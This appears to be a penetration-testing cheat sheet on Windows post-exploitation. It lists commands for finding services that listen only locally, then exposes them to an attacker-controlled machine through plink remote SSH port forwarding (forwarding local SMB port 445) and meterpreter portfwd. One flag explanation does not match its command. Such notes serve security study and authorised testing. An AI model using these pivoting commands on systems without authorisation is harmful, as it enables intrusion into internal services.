# Services only available from inside network

Sometimes there are services that are only accessible from inside the network (or host).

* List the processes and services running:
  ```
  c:> tasklist /svc
  c:> tasklist /v
  c:> net start
  c:> sc query

  pws> Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id Get-Service
  pws> Get-Service
  pws> Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

  ```
  `Get-Process` has a `-IncludeUserName` option to see the process owner, however you have to have administrative rights to use it.  
  `Get-WmiObject` returns the process owner without admin rights, if something is blank under owner it’s probably running as SYSTEM, NETWORK SERVICE, or LOCAL SERVICE.

* To see services that have connections:
  ```
  c:> netstat -ano
  ```

  In the output look for **LISTENING** and compare to port scan done from outside. Are there any services listed that was not available from outside? Could these be vulnerable?

  - Local address **0.0.0.0** means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface.

  - Local address **127.0.0.1** means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. **CHECK THIS OUT**

  - Local address **192.168.1.9** (or similar) means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet.  **CHECK THIS OUT**


## Port Forward - Remote forward services to outside

* Using **plink.exe**. Plink (PuTTY Link) is a command-line connection tool similar to UNIX ssh. If you have an ssh client on the Windows system, and you can establish SSH outbound to a system you control, then you can use a remote port forward, i.e. with option -R. This is effectively the opposite of -L, it sets up a listener on the remote (connected to) and forwards back [sic] through the system you're connecting from.
  ```
  > plink.exe -l root -pw mypassword 192.168.0.101 -R 4450:127.0.0.1:445
  ```
  - `-l root -pw mypassword` Refers to the SSH user on the remote server, `192.168.0.101`
  - `-R 8080:127.0.0.1:8080` Will set up the forwarding from this local port 445 to the remote port 4450.
  - On the remote system, you can then connect to 127.0.0.1:4450

  Command help
  ```
  >plink
  PuTTY Link: command-line connection utility
  Release 0.53
  Usage: plink [options] [user@]host [command]
         ("host" can also be a PuTTY saved session name)
  Options:
    -v        show verbose messages
    -load sessname  Load settings from saved session
    -ssh -telnet -rlogin -raw
              force use of a particular protocol (default SSH)
    -P port   connect to specified port
    -l user   connect with specified username
    -m file   read remote command(s) from file
    -batch    disable all interactive prompts
  The following options only apply to SSH connections:
    -pw passw login with specified password
    -L listen-port:host:port   Forward local port to remote address
    -R listen-port:host:port   Forward remote port to local address
    -X -x     enable / disable X11 forwarding
    -A -a     enable / disable agent forwarding
    -t -T     enable / disable pty allocation
    -1 -2     force use of particular protocol version
    -C        enable compression
    -i key    private key file for authentication
  ```

* Port forward using **meterpreter**
  ```
  portfwd add -l <attacker port> -p <victim port> -r <victim ip>
  portfwd add -l 3306 -p 3306 -r 192.168.1.101
  ```
